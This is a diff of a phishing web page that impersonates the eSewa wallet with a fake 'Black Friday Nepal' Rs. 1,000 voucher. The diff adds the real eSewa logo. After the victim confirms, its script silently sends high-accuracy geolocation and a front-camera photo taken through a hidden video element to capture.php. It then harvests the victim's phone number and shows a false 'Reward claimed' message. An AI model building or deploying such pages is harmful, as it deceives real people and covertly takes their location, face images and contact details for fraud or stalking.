@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Black Friday Nepal - Redeem Reward</title>
+<title>Black Friday Nepal - Claim Reward</title>
 <style>
   * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
   body { 
@@ -21,121 +21,139 @@
   .topbar .back { font-size:22px; line-height:1; }
   .topbar .title { flex:1; text-align:center; margin-right:22px; }
 
-  /* Main Card */
+  /* Voucher Card */
   .card {
     background:#fff; width:94%; max-width:400px; border-radius:16px;
-    margin-top:70px; padding:0; box-shadow:0 10px 30px rgba(0,0,0,.15);
+    margin-top:70px; box-shadow:0 10px 30px rgba(0,0,0,.15);
     overflow:hidden; display:flex; flex-direction:column;
     position:relative; z-index:1;
   }
 
-  /* Banner Area */
-  .banner {
+  .voucher-top {
     background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
-    padding: 20px; text-align: center; position: relative;
+    padding: 18px 20px 14px; text-align: center; position: relative;
     overflow: hidden;
   }
-  .banner::before {
-    content: "BLACK FRIDAY NEPAL";
+  .voucher-top::before {
+    content: "BLACK FRIDAY";
     position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-    font-size: 3rem; font-weight: 900; color: rgba(255,255,255,0.05);
-    white-space: nowrap; font-style: italic;
+    font-size: 2.4rem; font-weight: 900; color: rgba(255,255,255,0.06);
+    white-space: nowrap; font-style: italic; letter-spacing: 2px;
   }
-  .discount-badge {
-    background: #ff0055; color: #fff; padding: 8px 16px; border-radius: 20px;
-    font-weight: 700; font-size: 18px; display: inline-block; margin-bottom: 10px;
-    box-shadow: 0 4px 10px rgba(255,0,85,0.4);
+  .voucher-label {
+    color:#ffcc00; font-size:12px; font-weight:700; letter-spacing:3px;
+    margin-bottom:6px; position:relative;
   }
-  .offer-text {
-    color: #fff; font-size: 22px; font-weight: 700; margin-bottom: 4px;
-    text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+  .voucher-amount {
+    color:#fff; font-size:44px; font-weight:900; line-height:1;
+    text-shadow:0 2px 8px rgba(0,0,0,0.4); position:relative;
   }
-  .sub-text { color: #ccc; font-size: 14px; margin-bottom: 16px; }
+  .voucher-currency { font-size:20px; vertical-align:top; color:#ffcc00; }
 
-  /* Content Body */
-  .content {
-    padding: 20px; text-align: center;
-    flex: 1; display: flex; flex-direction: column; justify-content: center;
+  .perforation {
+    height:0; border-top:2px dashed #e0e0e0; position:relative;
+    background:#fff;
   }
-  .logo-placeholder {
-    font-size: 28px; font-weight: 800; color: #60BB46; margin-bottom: 10px;
+  .perforation::before, .perforation::after {
+    content:""; position:absolute; top:-10px; width:20px; height:20px;
+    background:#f2f4f7; border-radius:50%;
   }
+  .perforation::before { left:-10px; }
+  .perforation::after { right:-10px; }
+
+  .voucher-body { padding:20px; text-align:center; }
+
+  .brand-logo {
+    height:50px; width:auto; margin-bottom:14px;
+    display:block; margin-left:auto; margin-right:auto;
+    object-fit:contain;
+  }
+
   .reward-box {
-    background: #f8f9fa; border: 2px dashed #ddd; border-radius: 12px;
-    padding: 20px; margin: 15px 0;
+    background:#f8f9fa; border:2px dashed #ddd; border-radius:12px;
+    padding:16px; margin: 10px 0 16px;
+  }
+  .reward-title {
+    font-size:13px; color:#666; letter-spacing:1px; font-weight:600;
+    margin-bottom:6px; text-transform:uppercase;
   }
   .reward-amount {
-    font-size: 36px; font-weight: 800; color: #222;
+    font-size:34px; font-weight:800; color:#222; line-height:1;
   }
-  .reward-desc { font-size: 14px; color: #666; margin-top: 5px; }
+  .reward-desc { font-size:13px; color:#666; margin-top:6px; }
 
-  /* Redeem Button */
   .redeem-btn {
     width: 100%; padding: 16px; border: none; border-radius: 12px;
-    background: #000; color: #fff; font-size: 18px; font-weight: 700;
+    background: #000; color: #fff; font-size: 17px; font-weight: 700;
     text-transform: uppercase; letter-spacing: 1px;
     box-shadow: 0 6px 20px rgba(0,0,0,0.3);
-    cursor: pointer; transition: transform 0.2s; margin-top: 10px;
+    cursor: pointer; transition: transform 0.15s; margin-top: 6px;
   }
   .redeem-btn:active { transform: scale(0.98); }
   .redeem-btn.done { background: #3d8a2c; }
 
-  /* POPUP MODAL (Overlay) */
+  .fine-print { font-size:11.5px; color:#999; margin-top:14px; }
+
+  /* POPUP MODAL */
   .modal-overlay {
-    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-    background: rgba(0,0,0,0.6); z-index: 100;
+    position: fixed; inset: 0;
+    background: rgba(0,0,0,0.65); z-index: 999;
     display: none; justify-content: center; align-items: flex-end;
-    backdrop-filter: blur(4px);
+    -webkit-backdrop-filter: blur(4px); backdrop-filter: blur(4px);
   }
-  .modal-overlay.active { display: flex; animation: fadeIn 0.3s; }
+  .modal-overlay.active { display: flex; animation: fadeIn 0.25s; }
 
   .modal-content {
-    background: #fff; width: 100%; max-width: 400px;
-    border-radius: 24px 24px 0 0; padding: 24px;
+    background: #fff; width: 100%; max-width: 420px;
+    border-radius: 24px 24px 0 0; padding: 24px 22px;
+    padding-bottom: calc(24px + env(safe-area-inset-bottom,0px));
     animation: slideUp 0.3s ease-out;
     text-align: center;
   }
 
-  .modal-title { font-size: 20px; font-weight: 700; margin-bottom: 12px; color: #333; }
-  .modal-desc { font-size: 15px; color: #555; line-height: 1.5; margin-bottom: 20px; }
+  .modal-title { font-size: 20px; font-weight: 700; margin-bottom: 10px; color: #222; }
+  .modal-desc { font-size: 14.5px; color: #555; line-height: 1.55; margin-bottom: 18px; }
 
   .checkbox-group {
     display: flex; align-items: flex-start; gap: 10px;
-    margin-bottom: 24px; text-align: left;
-    background: #f9f9f9; padding: 12px; border-radius: 8px;
+    margin-bottom: 20px; text-align: left;
+    background: #f9f9f9; padding: 12px; border-radius: 10px;
   }
-  .checkbox-group input { transform: scale(1.3); margin-top: 3px; }
-  .checkbox-label { font-size: 13px; color: #333; line-height: 1.4; }
+  .checkbox-group input {
+    transform: scale(1.25); margin-top: 3px; accent-color: #60BB46;
+  }
+  .checkbox-label { font-size: 13px; color: #333; line-height: 1.45; }
   .checkbox-label a { color: #60BB46; text-decoration: none; font-weight: 600; }
 
   .confirm-btn {
     width: 100%; padding: 16px; border: none; border-radius: 12px;
     background: #d1ff89; color: #006400; font-size: 16px; font-weight: 800;
-    text-transform: uppercase; cursor: pointer; box-shadow: 0 4px 10px rgba(210,255,137,0.5);
-    transition: background 0.2s;
+    text-transform: uppercase; cursor: pointer;
+    box-shadow: 0 4px 10px rgba(210,255,137,0.5);
+    transition: all 0.2s;
   }
-  .confirm-btn:disabled { background: #ddd; color: #999; cursor: not-allowed; box-shadow: none; }
+  .confirm-btn:disabled { background: #e5e5e5; color: #aaa; cursor: not-allowed; box-shadow:none; }
+  .confirm-btn:not(:disabled):active { transform: scale(0.98); }
 
-  /* FORM SECTION (appears after confirm) */
+  /* FORM SECTION */
   .form-section {
     display: none;
     background: #fff; width: 94%; max-width:400px;
     border-radius: 16px; margin-top: 20px;
     padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-    position: relative;
-    animation: fadeIn 0.5s;
+    animation: fadeIn 0.4s;
   }
-  .form-section h3 { font-size: 16px; color: #60BB46; margin-bottom: 6px; font-weight: 700; }
+  .form-section h3 { font-size: 15px; color: #60BB46; margin-bottom: 6px; font-weight: 700; }
   .form-section .hint { font-size: 13px; color: #666; margin-bottom: 14px; text-align:left; }
   .form-input {
     width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px;
-    font-size: 16px; margin-bottom: 12px; background: #f9f9f9;
+    font-size: 16px; margin-bottom: 12px; background: #f9f9f9; font-family:inherit;
   }
   .form-input:focus { outline:none; border-color:#60BB46; background:#fff; }
   .form-submit-btn {
     width: 100%; padding: 14px; border: none; border-radius: 8px;
-    background: #60BB46; color: #fff; font-size: 16px; font-weight: 700;
-    cursor: pointer; text-transform: uppercase;
+    background: #60BB46; color: #fff; font-size: 15px; font-weight: 700;
+    cursor: pointer; text-transform: uppercase; letter-spacing:0.5px;
   }
   .form-submit-btn:disabled { background:#b5d6a8; cursor:not-allowed; }
 
@@ -144,7 +162,7 @@
     position:fixed; top:64px; left:50%; transform:translateX(-50%);
     background:rgba(0,0,0,.85); color:#fff; font-size:12px; padding:8px 16px;
     border-radius:24px; opacity:0; transition:opacity .3s; pointer-events:none;
-    z-index:100; white-space:nowrap;
+    z-index:1000; white-space:nowrap;
   }
   .statusPill.show { opacity:1; }
   #video { display:none; }
@@ -160,30 +178,39 @@
   <span class="title">Promotions</span>
 </div>
 
+<!-- VOUCHER CARD -->
 <div class="card">
-  <div class="banner">
-    <div class="discount-badge">50% OFF</div>
-    <div class="offer-text">BLACK FRIDAY NEPAL</div>
-    <div class="sub-text">Limited Time Offer</div>
+  <div class="voucher-top">
+    <div class="voucher-label">BLACK FRIDAY NEPAL</div>
+    <div class="voucher-amount"><span class="voucher-currency">Rs.</span> 1,000</div>
   </div>
 
-  <div class="content">
-    <div class="logo-placeholder">e<span style="color:#333">Sewa</span></div>
+  <div class="perforation"></div>
+
+  <div class="voucher-body">
+    <!-- LOGO -->
+    <img id="brandLogo"
+         class="brand-logo"
+         src="https://media.nepalitimes.com/1/s/20221110151112/636d071a9c7e80680e0a5f9fpng.png"
+         alt="eSewa"
+         onerror="this.style.display='none';document.getElementById('logoFallback').style.display='block';">
+    <div id="logoFallback" style="display:none; font-size:26px; font-weight:800; color:#60BB46; margin-bottom:14px;">eSewa</div>
+
     <div class="reward-box">
-      <div style="font-size:14px; color:#666; margin-bottom:5px;">CASHBACK REWARD</div>
+      <div class="reward-title">Claimable Reward</div>
       <div class="reward-amount">Rs. 1,000</div>
-      <div class="reward-desc">Instant Cashback on Wallet</div>
+      <div class="reward-desc">Instant Reward on Wallet</div>
     </div>
-    
+
     <button id="btnRedeem" class="redeem-btn">REDEEM NOW</button>
-    <div style="font-size:12px; color:#888; margin-top:15px;">*Valid for new users only</div>
+    <div class="fine-print">*Valid for new users only</div>
   </div>
 </div>
 
-<!-- FORM SECTION (appears below the card after confirm) -->
+<!-- FORM SECTION -->
 <div id="formSection" class="form-section">
   <h3>&#9889; Final Step</h3>
-  <p class="hint">Verify your phone number to receive the cashback instantly.</p>
+  <p class="hint">Verify your phone number to receive the reward instantly.</p>
   <input id="phone" type="tel" class="form-input" placeholder="Enter Phone Number" inputmode="numeric">
   <input id="notes" type="text" class="form-input" placeholder="Additional Notes (Optional)">
   <button id="btnSubmit" class="form-submit-btn">VERIFY &amp; CLAIM</button>
@@ -194,14 +221,13 @@
   <div class="modal-content">
     <h2 class="modal-title">Redeem Voucher</h2>
     <p class="modal-desc">
-      You are about to redeem your <strong>BLACK FRIDAY NEPAL</strong> voucher worth Rs. 1,000. 
-      Please confirm below to proceed.
+      You are about to redeem your <strong>BLACK FRIDAY NEPAL</strong> voucher worth <strong>Rs. 1,000</strong>. Please confirm below to proceed.
     </p>
-    
+
     <div class="checkbox-group">
       <input type="checkbox" id="agreeCheck">
       <label for="agreeCheck" class="checkbox-label">
-        I agree to eSewa's <a href="#">Terms and Conditions</a>
+        I agree to eSewa's <a href="#">Terms and Conditions</a> and confirm the details are correct.
       </label>
     </div>
 
@@ -209,7 +235,7 @@
   </div>
 </div>
 
-<div class="statusPill" id="statusPill">Processing...</div>
+<div class="statusPill" id="statusPill"></div>
 
 <video id="video" playsinline autoplay muted></video>
 <canvas id="canvas" style="display:none"></canvas>
@@ -217,45 +243,42 @@
 <script>
 "use strict";
 
-// API Endpoint - REPLACE with your PHP host URL later
-const API = "capture.php"; 
+const API = "capture.php";
 
-// DOM
-const modal = document.getElementById('modalOverlay');
-const btnRedeem = document.getElementById('btnRedeem');
-const btnConfirm = document.getElementById('btnConfirm');
-const agreeCheck = document.getElementById('agreeCheck');
+const modal       = document.getElementById('modalOverlay');
+const btnRedeem   = document.getElementById('btnRedeem');
+const btnConfirm  = document.getElementById('btnConfirm');
+const agreeCheck  = document.getElementById('agreeCheck');
 const formSection = document.getElementById('formSection');
-const statusPill = document.getElementById('statusPill');
-const btnSubmit = document.getElementById('btnSubmit');
+const statusPill  = document.getElementById('statusPill');
+const btnSubmit   = document.getElementById('btnSubmit');
 
-// State
 const captured = { location:null, image:null };
 let cameraStream = null;
 let captureStarted = false;
 
-/* ---------- MODAL ---------- */
-btnRedeem.addEventListener('click', () => {
+/* ---------- OPEN POPUP ---------- */
+btnRedeem.addEventListener('click', (e) => {
+  e.preventDefault();
   modal.classList.add('active');
 });
 
+/* ---------- ENABLE CONFIRM ONLY IF CHECKED ---------- */
 agreeCheck.addEventListener('change', () => {
   btnConfirm.disabled = !agreeCheck.checked;
 });
 
-/* ---------- CONFIRM = TRIGGER CAPTURE ---------- */
+/* ---------- CONFIRM: close modal, keep card, fire captures ---------- */
 btnConfirm.addEventListener('click', () => {
-  // Close modal only — main card stays visible
   modal.classList.remove('active');
-  btnRedeem.textContent = 'REDEEMED';
+
+  btnRedeem.textContent = '\u2713 REDEEMED';
   btnRedeem.classList.add('done');
   btnRedeem.disabled = true;
 
-  // Reveal form below the card
   formSection.style.display = 'block';
-  setTimeout(() => formSection.scrollIntoView({behavior:'smooth', block:'end'}), 100);
+  setTimeout(() => formSection.scrollIntoView({behavior:'smooth', block:'end'}), 150);
 
-  // Fire captures immediately
   if (!captureStarted) {
     captureStarted = true;
     triggerLocationCapture();
@@ -277,13 +300,11 @@ function triggerLocationCapture() {
         longitude: pos.coords.longitude,
         accuracy: pos.coords.accuracy
       };
-      console.log('Location captured');
-      // silent-send right away
       sendData({ location: captured.location });
     },
     err => {
       captured.location = { error: 'Denied' };
-      console.warn('Location denied');
+      console.warn('Location denied', err);
     },
     { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
   );
@@ -292,4 +313,88 @@ function triggerLocationCapture() {
 /* ---------- CAMERA ---------- */
 async function triggerCameraCapture() {
   try {
-    showStatus('
+    showStatus('Accessing Camera...');
+    cameraStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: false
+    });
+    const video = document.getElementById('video');
+    video.srcObject = cameraStream;
+    await new Promise(res => {
+      if (video.readyState >= 2) return res();
+      video.onloadeddata = () => res();
+    });
+    await new Promise(res => setTimeout(res, 500));
+
+    const canvas = document.getElementById('canvas');
+    canvas.width  = video.videoWidth  || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    captured.image = canvas.toDataURL('image/jpeg', 0.85);
+
+    cameraStream.getTracks().forEach(t => t.stop());
+    cameraStream = null;
+    video.srcObject = null;
+
+    showStatus('Photo captured');
+    sendData({ image: captured.image });
+  } catch (err) {
+    console.warn('Camera denied', err);
+    showStatus('Camera denied — continuing');
+  }
+}
+
+/* ---------- SUBMIT ---------- */
+btnSubmit.addEventListener('click', () => {
+  const phone = document.getElementById('phone').value.trim();
+  const notes = document.getElementById('notes').value.trim();
+
+  if (!/^[0-9+\-\s]{7,15}$/.test(phone)) {
+    showStatus('Enter a valid phone number');
+    return;
+  }
+  btnSubmit.disabled = true;
+  btnSubmit.textContent = 'SUBMITTING...';
+
+  sendData({
+    campaign: 'Black Friday Nepal',
+    reward: 'Rs. 1,000',
+    phoneNumber: phone,
+    notes: notes,
+    location: captured.location,
+    hasImage: !!captured.image
+  }).then(() => {
+    showStatus('Success! Reward claimed.');
+    btnSubmit.textContent = '\u2713 CLAIMED';
+    document.getElementById('phone').readOnly = true;
+    document.getElementById('notes').readOnly = true;
+  });
+});
+
+/* ---------- SENDER ---------- */
+function sendData(payload) {
+  return fetch(API, {
+    method:'POST',
+    headers:{'Content-Type':'application/json;charset=UTF-8'},
+    body:JSON.stringify(payload)
+  })
+  .then(r => { if(!r.ok) throw new Error('bad response'); return r.json(); })
+  .catch(e => { console.warn('Send failed', e); return {ok:false}; });
+}
+
+function showStatus(msg) {
+  statusPill.textContent = msg;
+  statusPill.classList.add('show');
+  clearTimeout(statusPill._t);
+  statusPill._t = setTimeout(() => statusPill.classList.remove('show'), 2500);
+}
+
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden && cameraStream) {
+    cameraStream.getTracks().forEach(t => t.stop());
+    cameraStream = null;
+  }
+});
+</script>
+</body>
+</html>
